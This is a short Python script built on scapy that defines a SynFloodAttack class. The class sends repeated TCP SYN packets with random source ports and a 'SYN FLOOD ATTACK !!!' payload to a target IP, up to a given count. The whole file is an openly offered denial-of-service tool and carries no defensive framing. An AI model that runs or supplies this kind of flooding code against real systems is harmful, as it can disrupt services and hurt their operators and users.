from scapy.layers.inet import *
from scapy.packet import Raw
from scapy.all import *
from threading import Thread

host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)


class SynFloodAttack:
    def __init__(self, dst_ip, dst_port):
        super().__init__()
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.sending = True                          # current process
        self.sending_count = 0                       # syn count
        self.data = "SYN FLOOD ATTACK !!!"           # data

    def syn_flood_attack(self, count):

        while self.sending:
            syn_flood_src = IP(src=host_ip, dst=self.dst_ip, len=2048) / \
                            TCP(flags='S', sport=RandShort(), window=1500) / \
                            Raw(load=self.data)
            send(syn_flood_src)
            self.sending_count += 1
            print("Sent packet count: " + str(self.sending_count))
            if self.sending_count == count:
                break

